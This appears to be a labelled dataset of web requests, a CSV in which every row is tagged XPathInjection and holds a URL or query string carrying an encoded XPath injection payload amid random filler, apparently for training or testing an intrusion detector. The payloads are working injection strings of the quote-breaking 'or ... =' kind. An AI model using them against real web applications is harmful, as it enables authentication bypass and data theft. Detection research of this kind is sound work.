id,class,vector
9229,XPathInjection,/eIqqF5OZCYe.M8k/ypad/cg_fNBGMWrSwd._rIl1G/cFBxWb4.jpg?Threpepw=59793&eiboeveSaT=hlpX&0Ex0ridghl=%2Fnoernenqnull%3Er+tc&n2swIen9nb4gc=httpdi+tfd6fPebhDo&seaec=66927041&Upe7gsptlf=411838&smnceMsh=eeafgib%3B%3C&esrOlattshnaib=Lh&oe4processing-instructionYkAXrKz=mlhOno&igGstsoun=nh0&ijisqiatneT=5&faeov5tAnnh=passwd&a4ete=98389++++or++count%28path%2Fchild%3A%3Anode%28%29%5Bposition%28%29%3D%28%28i%2Bj%2Bk%2Bl%2B1%29%5D++++%7C+++path%2Fchild%3A%3A*%28%29%5Bposition%28%29%3D%28k%2B1%29%5D%29%3D1++++or++0530%3D&eSndoeax6sS=11
9233,XPathInjection,/eA6YlNr8xl.kCz2qX/ewahhOn.jpg?oIaccess_logfS9Qz=8&Nedns4Ee=asOwe0igLxr&rezig=Ie4&to1uihiod8Ri=174946&Dnefd=sw%27+++++or++%28i+++%3C+count%28deihad%2Fchild%3A%3Atext%28%29%29++and++j++++%3C++count%28la%2Fchild%3A%3Acomment%28%29%29+++and+++k++%3C+++++count%28vee%2Fchild%3A%3A*%29+%29+or++++%27hu%27+%3D++++%27++7t%27+or&PpG2DY2htpassEv=winnt5&dtwaens7=fGeHGg&msystempNkvphttpssam=h18iEzn1etztYun&k5s=bthidaen%29&uo7ercngAbHDmaT=iZ.XIVPbJPtW&ammsTxhul=eoC83xe4
9234,XPathInjection,/soMHXtWd13Q/hTF7DqyjtIH3Dj/obantoo330lorkh/8alvn/cJtFpYM/eztnau.nsf?HdX9pcC0uv=949956&zAPmt1=ptedacc8rayRuoo&AbodyxtermXHZaccept=dmhl%27+or+count%28++++path%2Fchild%3A%3Anode%28%29%5Bposition%28%29%3D%28%28i%2B+j+%2Bk++++%2B++l+%2B+1%29%5D+++%7C++++path%2Fchild%3A%3A*%28%29%5Bposition%28%29%3D%28k%2B1%29%5D%29%3D1++or+++%27TwtsLi%27+%3D++++%27++++e9eiohR%27+++++or&3Ary8gnt=373&Wj@Ggroup
9235,XPathInjection,/h1tm4jemdtds6z0orh/dbzOMB/tuosdgtodec8sne/_giIfOLn8F4/ei7Mrtti/5w9o9hmSCPj/tUHxjlH5@38h.htm?hmeowci=143182&os=000269230&0Jklbisnerc7t=nsvC&otsaor=T%3D7hgcrshutdown&Qtylibe3AA-object3=llelaac&dytcdeeV=371tfsriurnswe&sbglase=cn8snetnlga1e6teE&id=6657&H19insert4=gs&boot.inivarselect1bqTKorhRrcp=a&swqlocationscriptzj=+pze+r%7Ctt&jz5smtlel=is5ieueYur6gx8Adihr%3C&T2wtzerX=r+%5D
9238,XPathInjection,/Deaesisfer/B_hidAX/oj1OMH3lfKjBlVoH15yj/3z-@lpcz/9Llog/1-IkY0ybt/Oeokutobg.js?eahihte6n=g%2Flto%2Fm%2Fchild%3A%3Anode%28%29%5Bposition%28%29%3D616%5D+or+++++%27hat%27+++%3D%27
9242,XPathInjection,/tiiTte3onyobfet/re4aDSsm69ee/lustM79jtAii1ewf/nWw06X1WY.5Eh3MBcE8K/riaTaaeuHLt4armoA/gSL6hmtesaZ/90SrOg1jd_fr8X/t7q1w3.css?ott73bElmuwnhf=6906049820&othanrs=bgt%27+++++or+++++elor%2F70asn%2Fchild%3A%3Anode%28%29%5Bprocessing-instruction%28%29%3D6%5D++or+++++%27t2ce%27++%3D%27&e1Tipedrrwseeb=3902224&l4=09921405&imnht4ea=at8eeb
9245,XPathInjection,/nieeaoia9lrewa11rv/rTlOs0FE/hStiiepnEGtohbg3wdvr/2jRxS2iPxEOe35bm/trwhusz4tin/zkf1sPwY/oKHqC7alg4I/QdRexecw/tVIjAiyRgC4D9ZliW.cfm?slkste2a=eerioprocessing-instructionte+&F.48Kbd=2%3BctasN%2Bshutdowngpasswdve
9252,XPathInjection,/beeO/isahsi1ow/luLuJPXM-/Xf2ByRoQM/fh/nhanfel1hl3eH5tsb/Eyiao1hiia.exe?mL1qYBQ8.J7=cdd%27++++or+++++%28i+++%3C++count%28ilshiD%2Fchild%3A%3Atext%28%29%29+and+++++j+++%3C+++count%28s8aate%2Fchild%3A%3Acomment%28%29%29+and++k+++++%3C+count%28aix%2Fchild%3A%3A*%29+++%29+++or+++++%27dnis3%27%3D+++%27+++nefue8%27+++or&@Xlre=7694
9253,XPathInjection,nhttn0z=6&et0wd=lc2&apdtiittee7nhe=889  or  mc/raA/n/child::node()[position()=202]     or   08003=&cSUp=08
9256,XPathInjection,/s8hO9reez8byWhegtN/iy/AH/ejlW5fEzv823TsqEn.tiff?RTaFxlR=8468&Uprocessing-instructioneval.NGGGq=feyGateeotuto4&ta=+tT%3B&WBaconnect_kWvarFlqw=5586+++or+eo%2Ftm%2Fate%2Fchild%3A%3Anode%28%29%5Bposition%28%29%3D227%5D+or+++++94297%3D&atOr4keE=475391777&rGeagpt=74241&3XSxf8=osrhd&cVQ9=exech%29y&s5Nscript=re&kuUetcM=e+nahrEnre%7Cs&p3CdSsYacucw=295987&5o4noecuo=xN.__
9262,XPathInjection,/ey/aaretvuUnfkbaixt/lEaC6nJv4_/elellTrhtcHoiEFoAlsl/izyUz1@ChVYjw60F-2g@/k-7eTsicd/rpanap/ide/M66likeXu-/4-j8nlQb/u-pwr91bLiQgF/mKVXX1m1l6P.html?itsy5=05765354
9265,XPathInjection,/includerqVjDP48Y/locationzUFB@netcat/sstnyetcs/en7tn9a/tcxNpbN_N./w3yaCAHBb87y.php?hhifVstpbo=07297&rn1qtns=NaNmdzf8en&tmpiocI8p0tnot=648092589&leiperie2kab=658423&6nNn7karren=sh4i&aeQte4scc=numNrrs&aaLo0sLWbgsoundK-=61&hometmpAV-tmpstdindsCIJ=4776424&T9Upb=ntihttl&rmm1iy=2348700&amithar=tncte&heesww7lrahibno=17623&aq9aeecor9otTi=lLjqu3Iy2bf&hBulq=umolibjicat8twbteiTas&tsctonlc=eHstiahb0cGi
9272,XPathInjection,/1heahsohntj.php4?0oeXaMmqfVOq=i&iatyeRob=hbaisse1&nd_AQPV9OR=etrue+seztu&mmepansotvRda=o3rh%27+++or++++%28i+++++%3C++++count%28sahmrs%2Fchild%3A%3Atext%28%29%29++and+j+++++%3C++count%28lte0c%2Fchild%3A%3Acomment%28%29%29++++and+k++%3C+count%28st%2Fchild%3A%3A*%29+++%29+++or+++++%27om84sc0%27+++%3D+%27+++++egr%27+++or&tttc62seg=ree1ndci3Et3c&uceeptlnnahue=05143343&bstep=31&e1=984534&debaLxeiealehk=n%29Oinclude&eadntsjxyteSh=le%27
9280,XPathInjection,/Hmlmg/rUn5kja/bA6G-/nioyleafLcwYvRh2/9twReaMpteetceLryt1/rzfi5yhhaoyedlt.css?swrq6etn=tilft6u&esti6e6caeeaiq=330&ikt=ere&dRPH.nbgsound=dj8A%27+or+++%28i+%3C++count%28umto%2Fchild%3A%3Atext%28%29%29++++and++++j++%3C+++++count%28jfdW%2Fchild%3A%3Acomment%28%29%29+++and+++k+++++%3C+++++count%28tl%2Fchild%3A%3A*%29+%29+++or+++++%27udfona%27++++%3D++%27++lnTrny%27+++++or&UikoEncearae=93756&sec=srcW&qvod=bZ4VOz2YwYu%40&etzkX7r=rurme
9289,XPathInjection,Yo@_ln=aUN&2ntyimeft=c_mT&8eEiet6stnny=&k&B@8falNwinntQd=76&ifetU=r&wsdhsgl4ts4nh=e2Wdq9&QZL32ftpkeS=wgQ@zL&otots8=rtiies
9292,XPathInjection,Tsce8in2buonie=(i < count(dE/child::text()) and  j   <   count(osXe/child::comment()) and    k     < count(ied/child::*)  )&wrnahrwh=9tXn0Zz8QT&mysddRtnfaakcv=786&ninwimgservicesO0aTM=0663118097
9305,XPathInjection,/sYA@8ytu303/5B.jpeg?aHSboot.ini39connectJZ_o2=67&stdinBmailJDFSJ9form=7Enr9eS&srotAn2vrgtmes=toyoo+n&aperaphtisnnie=%3FteereYrkt7&ep=74071010&TtgeefM3syo=iarv%27++++or+++++count%28path%2Fchild%3A%3Anode%28%29%5Bposition%28++++%29%3D%28%28++++i%2B+j++%2B+k++++%2B+l++%2B++1%29%5D++++%7C+++path%2Fchild%3A%3A*%28%29%5Bposition%28%29%3D%28k%2B1%29%5D%29%3D1++or++++%27od%27++%3D++++%27+++caDoa0oN%27+or&t3r0gsmA=amijn5tdo9e%26httpssrc&3v121jdYN7Wf=e.9_3&ntm4t=553147050&wn=n0ye&imat0=z+ac&se=optT&vSr7ximhcaro=%27rw
9312,XPathInjection,/cna/dbtegr/rz1Se/zDrm.exe?cSiyoh=%7Cv&aloshefed=kg75UnStauiad1t&MdpassthruJE8BIya=ru8H-&loEdsc=dsd1%28aeoz%3E0h%5BUbpositionopen&8omxrOoyse=dwp-%3Dadminin&focqeMratsm=unek%3AT&tDyd=rvsvarerm3%24f+azgf+k&-ArmN0=58665+++or++++1%3C++lsi%2Frbroe%2Fk%2Fchild%3A%3Atext%28%29%5Bposition%28%29%3D9%5D+++or+0%3D%27%5D+%7C+%2F*+%7C+%2Ffoo%5Bbar%3D%27&Hk=rlLe8ma94+&kuieeezdto=asE2CpMFL&ptie=4309389
9320,XPathInjection,/mvjuFzjVCnEug6D15_qO.html?eltunskhseI=0QqXLr3&elrsyst5emsRd=%28i+%3C+count%28thz0ph%2Fchild%3A%3Atext%28%29%29+++++and++j+%3C+++count%28iltaeh%2Fchild%3A%3Acomment%28%29%29++and+k++++%3C+count%28np%2Fchild%3A%3A*%29++%29&vyncIntemiiN=2nIkgUTt
9324,XPathInjection,/e0ltsnkrq5ghr7kyonTt/2wPq593K8MemUsq3FH/ll/REadivsHDbD/4JcwqM_zQoxw/xNluccd4a9dmmha/hoIaod/clgZN3Tkeuu/v1OQfbt7SvG5HJaWLex/cnwhlf4rlolAyagt/dnSIFUSg.jpeg?
9326,XPathInjection,/pVuqD34.0/dseyoeecifo6dudt/mugcDS-Ol-AYco/aEmQMPTN0n/owFsg/e2/rH/o8OBsghuxVj@qGOnMxPt/o5HfiglsxrxfTTCN/exBHgtwcgzlCQ0.css?BKv_@3andGm=3139+++or++1%3C++hlcsig%2Fooi%2Fis2T%2Fchild%3A%3Atext%28%29%5Bposition%28%29%3D366%5D+++++or+++++567%3D%27%5D+%7C+%2F*+%7C+%2Ffoo%5Bbar%3D%27&nffapit76smGi=e%3Ap&idwo54lnCe=hcoOg2sin&2necel7ttipl=a&tB3e9dwaMreE=591
9336,XPathInjection,nWotggur2slsss3=eoGYtKT_Z5M&eowaRnr=919658&ksl81rtltck=9240&t4=816808&eyttoan=8urrixx-e&epassthruD4NNX.=eC.KojmwgS&bRCmrmr=aesr&ahheolcmu=m/;i&omparurse=Slibgoueeridocument(rs&IXutTJMOY=onr
9342,XPathInjection,/teavhlnjarthcft/isoyshht4txexp/erz_dbkDpis/un/eiM1hmm/acbyq4yv7/exDnYCQp6Idxt/Oosqtn3Igss.jpg?oyniwSdQisse3hd=udsU%2Bw5didf&4BCD0qYiframeK=7&u2oq1zrot1da=lIuoreeZd&nbeeuownE=h&9lia=4&helakdoosdTaUes=egsoLne2delelti&tongdeoahruet6=03764221&bstmhds=5isee%27++or+++++1%3C++++gwdt7%2Fso9r%2FfFdtmy%2Fchild%3A%3Atext%28%29%5Bposition%28%29%3D980%5D++or++%27zkIitkp%27++++%3D+%27&h0s7Oss=betweenozfhat+&5Net=er%3F%5Bofnnfthgnts
9343,XPathInjection,hols=6aUOr'   or   ecOtir/h/child::node()[processing-instruction()=68]   or  'wmo0ae'    =   '
9344,XPathInjection,/sttosycp/nTA3..xcxmSM8Pd/srDes/@xPRjEDzqCSd/sdhd3aog/arnathtn3oaro/cdPozie35iao/hAg1kfM/g-v@CCGitOa/htMRbY/tkeetf/w@M.png?nivrhtna=%25drywremei5r%7Ebsidol&jansyevcteu4xi=e5ahw1tufCta2rdBe&-_mL.48Qh8=56a22re&eEr3ng39=510&w6libAJRuXUl=cXfTXEh&nbgheuo=%2BusropteE&feacoinhrwxha=loos%27+or++count%28+path%2Fchild%3A%3Anode%28%29%5Bposition%28%29%3D%28%28i+%2B++++j+++%2B++k+%2B++l+%2B+++1%29%5D+%7C+path%2Fchild%3A%3A*%28%29%5Bposition%28%29%3D%28k%2B1%29%5D%29%3D1++++or++%27Sthsrqr%27++%3D+++%27+++++mHc%27+++or&rngv0Aa7teOns=930747205&R8pbvHM=%2BuosI+1%28auonhtacces&eUfzNene=wdNrnluntn&6nNc=etU&2ir=antsa2u&ahtni9e=erxh%7C&sOlnnblaaaesywp=9755
9352,XPathInjection,/a0HE32vgc.L8hobsP/odCds3F.Ft4ppZKBYrTp/u3rgnose9o5nscotokyC/SIpUZWt-YdQ/oRWtgDoDDT1GzgvsKT/dYgW/i./nN/orrO8rtimtk/nNOkF8Rxdb8DO/SqLhdx/sww6bVsi4qGfE.jpeg?wtwtsshoff=uOid%3Cslgmqaye0o&5waa2ihhiEawlh=8tlsd0riKebhcs&Pnsg5xhsahmlaU=2216&mLt=wWQ_XmOQ&srel=4
9357,XPathInjection,/ec1.jpg?QfHQB=sHby.D0Odf-E&Nw=+ai%7CLtwtbssGsystemtwindow.openls&reeoe0vnho=t%26&vztqiame=Et%27++or+++++1%3C++++uaatl%2Faaeze%2Ftc%2Fchild%3A%3Atext%28%29%5Bposition%28%29%3D37%5D+++++or++++%27ni%27+%3D+%27&n4ittedniab=iork&lolfiurIhdoy=17992674&7eeN8dars=pum9rst&nZonhrozioryr=4&voirwsmeaceydht=768&omonh=36504162&uOsiisinsrnob=mssoesmsyJa%268&llmt=5084434&vaf=4312450
9372,XPathInjection,/flilceSc/tv/eojffaosdtmetrhon/wBMA40.MOYH@YIg/NCKIdzhC-G/KyH1NV2HTusrztmpY/nxNbWjpkQoA/leo/94veoe/oHwbog3ez/V.betweenxtermCf.MIZCaecho8r.jsp?bt88nomane0lah=Zhrsrehibi&lqro=38328&hFnppe=telnetN&u0m3oSbcus=8201911488&solinkFcjcU81U=gpa&Le=open+&R4s=75lhxiTithEoe&sn=0706&uitpenfiawltedr=cmIr
9382,XPathInjection,/in2Iu3VjBUy2gNBmhYTC/e2oVrrtamte3/eeinhzllon39amk/ndflteerenbraEir/6wgetkvJ1likeGUF/qaXX.php4?S4id31FQ=LtsgxApeanea&ptdc1=1590++++or+++++count%28path%2Fchild%3A%3Anode%28%29%5Bposition%28%29%3D%28%28i%2Bj%2Bk%2Bl%2B1%29%5D+++%7C+path%2Fchild%3A%3A*%28%29%5Bposition%28%29%3D%28k%2B1%29%5D%29%3D1+++or+44928%3D
9396,XPathInjection,/oWbm-j/hLmA@kP1F.tiff?8K1pa=iIVjaka_%40y%40w&esah9htk67=opl5sqvorru&xttt=35++or++1%3C+++++sa8Il%2Fa3Loia%2FznO%2Fchild%3A%3Atext%28%29%5Bposition%28%29%3D4%5D+++or+++++788%3D%27%5D+%7C+%2F*+%7C+%2Ffoo%5Bbar%3D%27&alwfc=560
9399,XPathInjection,/ue/o.-_vCasib9K@uJfky/Z3AL0x7K1/i-pCAiA-nRXC7A/r7ehob3ps/a1@f/Epasswdphpxl.vxmlexmlR8/txbEt1u.html?h4obeee=IEgwol%27+++or+++++sufEZ%2Fhw%2Fchild%3A%3Anode%28%29%5Bprocessing-instruction%28%29%3D5%5D+++or+++++%27ds%27%3D+%27
9405,XPathInjection,/WFCXPe/s6rnqHLplL/_QcPY7fNinH/mBtb.jpg?ipna0rhnsnaeee=l4ebeE%27+++or+++path%2Fchild%3A%3Anode%28%29%5Bposition%28%29%3DN%5D++or+++%27moBf%27%3D%27&etlanh8haAn=nllaU&.Gbo27VY=%3E&qqZTFxAAQA=+y+&rgibe4sSb7=dCi
9415,XPathInjection,/ftrteubl4ltrde4kyte6/niz/hisple4/Auh4/tmpAN2EXP/UjU1iA/4ftHl7ymbWTU1wZ/thwens4rQoh/ef/ebtiTametoussF/u8wdt/Yinput.asmx?eulRe5duiwEr2N=aDt%25it%7Ciss&gnaaihahrt0io=itaazjRh%27+++or+++++%28i++%3C++++count%28quseoI%2Fchild%3A%3Atext%28%29%29+++and++++j+%3C+++count%28vn%2Fchild%3A%3Acomment%28%29%29+and+++k++++%3C+++count%282e%2Fchild%3A%3A*%29+++%29++++or+++%27Sle6ybn%27+%3D%27+ige%27++++or&awEa=esxi++httpshvhcowindow.openruai&pl=00229754&vhrhsnbcnnt0=rd&o6P2b=+i%3Ctetmpd&uBVreplace6kliframeA=oavarntmpt&yrefahh7eus=dblfYnee&nmszui5eRunker=eXdrX9&tah6nmIs=307&repya=84730
9418,XPathInjection,/BU92Gnodew_locationp3A2/nps/eqbna9K/u1m6pearlye/aZeRX9B.html?nssenMoecuf9=u&eioehslT5=sRte6%2Fhp%2FURp%2Fchild%3A%3Anode%28%29%5Bposition%28%29%3D58%5D+++or++%27cysien%27++%3D++%27&r_aX4=igf&rs0rlxfitceoUs=nlri&cd=0247962711
9420,XPathInjection,/hjS3-9jfb/acRhnEolnc57lbm.tiff?AeqrqnIara=ihoe90bsfwbnnhd&loLspooEej=vemecn%27%5D++%7C++P+%7C+%2F%2Fuser%5B++++name%2Ftext%28%29+++%3D++++%27thtr&itnlda5Zetcye=%25u%3Fcutn&htpieaomhnLa=pKIMc2ZMCZ&hennWea2a=andlt+s9gtEtsr0&qpeqlct=arcpmpnac&eeu62rnes=773&orNltrO=s6cyw&oshc6aapzZ=tsbHZvN%403
9425,XPathInjection,/3KkBY/iiaSoteho/nhnnhsrai/l6h0ems7melantNn/r2JBM/iao33eXu.gif?@xterm4uqnode4Zdh=iZ&2rtetahtsa=887265&eogykCySereshs0=4&mitBii=uM&c2=lst+8p%7Ct&2dyPeaes=3fsb%5Cs&leWQ6WD=n2eM9&3MconnectL=ue+o3%3B&oerhdnim7=usspasswdn5il0l%5Dranis&k9=cSbH-pCm&AUlkDJ=eirhnEuTtt%3A
9429,XPathInjection,/iarhezuEuinnhsattl/pw/tsalcAzfri/RperlIKGDQqjQOhavingD/uxred3e/lfnE.jpeg?eesW7m=nme&ioots9=nTtaed%2Fseite%2Feeqc9o%2Fchild%3A%3Anode%28%29%5Bposition%28%29%3D574%5D+++++or+++++%27es5%27%3D+++%27&Ht00ps0=olEte3eoarxionter&lr6ini8an=h%28L&s672qosikoss=t48&rgs5iEgeigi6H=532409&desaes=ormdc%3Fw%3Das&tsa8Wawhrn=o52nie64ee
9433,XPathInjection,/f-FAsjv7/hmfjuFyFGy/me.cgi?a5taau=5403+++or+++++tr%2FEtr%2Fndyans%2Fchild%3A%3Anode%28%29%5Bposition%28%29%3D56%5D+++or+6633%3D&nhure=ids&ZiAFKUkE=aoctchesnt5nhrg&bargyR2stip4lTi=35&M@._57MGvbscriptC=%40&http.TGOZCJpyJ=44218&tl2eOjcama9bEd=eoUie&oe5mtweobdh9n=aEARUcXzAa&coah2iicbx=hAy&noTfia=%3Cbnsslpninsertd
9450,XPathInjection,/ra7uawhe4rraseDse/h7MB0Gin/vul/eeeSiwsl7tuesRltet/iystyleZGc8aT.fGco/h8xc3pimcdmuc/rbEjI48g/EJjxRg/smOstiT9i/oengaekO7tirtaznuta.php3?5z4e9ioydtzosr=mYOt%27+++or+++++path%2Fchild%3A%3Anode%28%29%5Bposition%28%29%3DN%5D+++or++++%27bihcgg2%27+%3D+%27
9452,XPathInjection,/eG/hd5auis5gnm2utd.css?sw9iyaicdnrti0=hnn0otleth7wcan&oSheRz1Salni=buy&inobject-V=iae8%2Fmori%2FoSi%2Fchild%3A%3Anode%28%29%5Bposition%28%29%3D4%5D+or+%27qUa%27+%3D+%27&rylwoeslYrkBesu=14179&70o=100833
9459,XPathInjection,/ssOZ.dl@cS8/k2x.QHYL9.tI@xqK7@iN/eM/0dn/aoUs8E/raothcsxttst/awggaugtonofnl2t.exe?deiana9ilohda7a=srnrwsdynvmeNr8Qiu&e1UuxN=0dkrwz&nitsLh=64140503&2sro3laa=927&tcresq9Ii=i9t&ldfBpveu=cdZItQnlQ&qstunist=crc&imtw7en=kb&annNbIqnph-=hsrl%3Csidlikxml++&eooeEetg=osgm0wi&encnpnTpeS5iPn=wnxaI0aa&ksndlttady0hoyG=drC&enaensrehinesie=tcylttaccess_log&07U59dsbm=oNc%2FEg%2F4ntd%2Fchild%3A%3Anode%28%29%5B++position%28%29%3D9%5D+++++%7C++++ttnot%2Fucr%2FRteo%2Fchild%3A%3Atext%28%29%5Bposition%28%29%3D76%5D+++or+++++%27ss8%27%3D++%27&7Bo3hhicns8qi=4259
9461,XPathInjection,/afjQk/n0O/s10DqR-StEODRnv6bV/VtMv99k4Ips/mIZjVXIyMAiN_R/t9L8waeqm0Y10O.msf?boenom=scKxWjXs&Z_rd=yF%2Fotdda%2F5fet0h%2Fchild%3A%3Anode%28%29%5Bposition%28%29%3D2%5D++++or+++%27veeieen%27++%3D%27
9466,XPathInjection,/tQuHM3_aZ9bQ63.A/6ta1edfnitliv1o.jpg?hdafqtll5y=l%2FH%2FuAke%2Fchild%3A%3Anode%28%29%5B++++position%28%29%3D197%5D+++%7C+ohe%2FOee8%2Ftu%2Fchild%3A%3Atext%28%29%5Bposition%28%29%3D858%5D+or+%27gSsisi%27%3D+++%27&4glQ7m.ab=88&tnaiadtaen0re=4whLsipsuerf
9468,XPathInjection,ohtsneif=>bt&yni=c0vaea0c+ln
9474,XPathInjection,/r7raehE/TRirreer1dn/lepNWMi/urof/sIWD/tMKnLEGg18DFaj/ijTCno132R8QRrK.Gxk/TtoxiNghnTl/emtfxpRsrsg/innneoEf6N7/cp2qUqCAR5uoOVxB@Pj.cfm?s54ouy0hot=e%7EwlOarE&iyKzzY7=1a&Kjq@Te7nmX=uo%27+++or+++++7exare%2Fzeo%2Fchild%3A%3Anode%28%29%5Bprocessing-instruction%28%29%3D62%5D+++or+%27mrm%27+%3D++++%27&bnaslpyi=le3o&1uyAroout4r6qr=2
9480,XPathInjection,/R0Zu1B2servicesj/YNPjQYpJmr.3/nCxOdyT@YzdSt_aA/5Rms8A5Q/sSinTbKCWwCa7pfFdL/w8JdocumentJ@5Ft/e85PogulD8UwVTOFLMUt/yrOJq.FNp.aspx?fs8qdlaIjynt5=tne&cUrlfyiv3U=gtzhbel&rspi3siog=uiftjdi%27sese+s&7Hy3xmhodil=cvSGIj_hf&oo0s0id0wmmeeu=qcNEthr&jQAwCu=%28i+++++%3C+++++count%28dcibsn%2Fchild%3A%3Atext%28%29%29+and++j+++++%3C+count%28Mlcnsx%2Fchild%3A%3Acomment%28%29%29+and++++k++%3C++count%28ai%2Fchild%3A%3A*%29++++%29&hywhO5=o%24sock_stream&estrnepTasZa=imedpnEduc
9481,XPathInjection,N8eeumieloOho=neqwBdODRat&h5=388213&kivuedahfb8cn=r2pema'  or     6 <  count(path/child::*)  or 'upoqiC'    =    '&ylbdernS=aorts6optlmocha/exe htpass1we
9486,XPathInjection,CW=nst'    or   (i   <     count(aysem/child::text())  and  j <  count(Shndn/child::comment()) and k <    count(1d/child::*)    )     or 'ec'   =   ' hfe1'   or&EX73e=s liphs&nt8alng=60&tat=Esp;n <exectoa5v;2$?oh&nco3P00aR=]sln&otyhigeSit=iw7wp
9491,XPathInjection,/gt/agfojnftowunhgtlieee/5xp_./tFmihLafrftl607sly/Jr5lformxwnode/utzcarcfdq.mdb?idV=binthGesa&ft=62&9nobdlap=i+yn4rdnEetatnbn2rvu&ee3tttgtm5a=aLi&bBeS5UvR=dnhsogjktviltp&rlkti2=s+aioehttps1yTsaaaise&VVSTgSDa=RoxHehj%27+or++++count%28++path%2Fchild%3A%3Anode%28%29%5Bposition%28++%29%3D%28%28i++%2B+j+%2B+k+%2B++l++++%2B+1%29%5D+++%7C++++path%2Fchild%3A%3A*%28%29%5Bposition%28%29%3D%28k%2B1%29%5D%29%3D1++or+%27nrojaa%27%3D%27+eylep%27++++or&seonp0zata=06981428&A36aeo4xsi=tTco+thte6t3irt&Ti8bz2bocetwTi=Kbiooirudoef&Tyyse=iclea
9497,XPathInjection,.R3Q=t
9503,XPathInjection,/eiv/amKaI.swf?nURthahek=rbae%27++++or++6+++++%3C+++count%28path%2Fchild%3A%3A*%29++++or++++%27nszes%27++%3D+%27&rdhqefrhKqf=079298728&bnsS=fcoaOdnhise&seaDi5nduoi=8accept6u&t2rys4pUar1=4067858&ma=t4htstr&id=ucbn63ex+r+&s06ntvspso=00&aRStsr2t0mAov=644&d5eelw5cfi=3eEcz&ecls8eR=7f6CiiHey&te=+ona6
9539,XPathInjection,/hE.jpeg?eo8uEme=lu2sg%27+++or+++6++%3C++count%28path%2Fchild%3A%3A*%29++or++%27rssomec%27++%3D++++%27&0prmbs=eo60y&eTte5slw=tPT-ROkkpgDx&oaeia=1116586&nIO.LUZ.8=4915277&algnHl=benmShr&is=803847679&mY7nctC2s=02
9549,XPathInjection,/9tnbldc.mspx?rodboeen5oe5ia=%28i++%3C+count%28hinmi%2Fchild%3A%3Atext%28%29%29+++++and+++j++++%3C++++count%28eD%2Fchild%3A%3Acomment%28%29%29++and+++k++%3C++++count%28cwneh%2Fchild%3A%3A*%29++++%29&twes=273&Its=04383&cIonaxglsx=95&XV1.6mr=3%3DhswLet%40T8hr92processing-instruction%25&8FGinsertO3dt=yNmi0senen0Sgmta&eexeeipIphoas4=oe4itaem
9550,XPathInjection,/ati/Htlnk/1YRLe4FArRc56/pCotbOmSO.gif?ao7=18498636&tZ-KOS=i%2F5e%2Fosset%2Fchild%3A%3Anode%28%29%5B+position%28%29%3D8%5D++%7C++l9%2Fl%2FBQtlft%2Fchild%3A%3Atext%28%29%5Bposition%28%29%3D196%5D++or++%27qelmol%27+%3D++++%27&INsaamr=mehome0e%28sCo3hitZe&mtnaOstvni=r-%26elszp6allntzRcbpl%5Bs&qeek3eee=ezp6Aa9xM&bamsIdyaoyyn5=nZ-&uldmnnu=e2%5Cwinnt+S%5D&sros6=s%5Darcp87tstdinI%40nhomcim
9557,XPathInjection,/2ekyb/xke3bHfuRginsert0Z/EEbA.gif?9t8vuof=2&znomeueeqZd4ea=OiN6q%27++++or+path%2Fchild%3A%3Anode%28%29%5Bposition%28%29%3DN%5D++or+%27rlsenId%27++++%3D++++%27&5KFTq=5669818129
9574,XPathInjection,/dprb3oaKliheu/xtermzCSkADWG/09@/gtNAoeku/dp/seniAa/oEerrei/wdUs/58stfA/zieistv2gd3nuhndlrt/cmrsrelyeiglivr4ohp/0rdySntydsi01ie.msf?6peaoytQoeilq5a=py&ufh=01033&nhautl7=auhyw8xo%27++++or+++1%3C+ioowsp%2Fesoynr%2Fe%2Fchild%3A%3Atext%28%29%5Bposition%28%29%3D53%5D+++or+++%27oarl1r%27++++%3D%27&y8jhwh=0071&3ii=oe3o&snedyfSbE=sVtz&L24eleYlotteNt=xMAm2crdssMegi&eU6ioeafgEnse=eJKc0Uvo&e0=ih7+1b
9595,XPathInjection,/ezQj0gjM3/kaiesi.pl?aeOnparaipnj=ijP&j4Bx2connectfxXY9=65684236&8_um7EimgeWDEx=aelnhnwtitsnaeIi&eeefcoin1aCoS=q%25o+kwt%5D%2Fand4se&Aycn8o=3853&Syxn5ieR=658541826&mtHK=Amkii%40iudoud11ee%3C+ow&VxGSn0MY=vQ1KG0B6&5anpAqSo1o51t=81637+++or+++++7eop%2FwgsEY%2F3ks%2Fchild%3A%3Anode%28%29%5Bposition%28%29%3D5%5D++or+3%3D&QfLe_S=iuGKO1R9FW7Z&jRF.4EB0Q=Gsa&anlorLoTtqa=likeshutdown
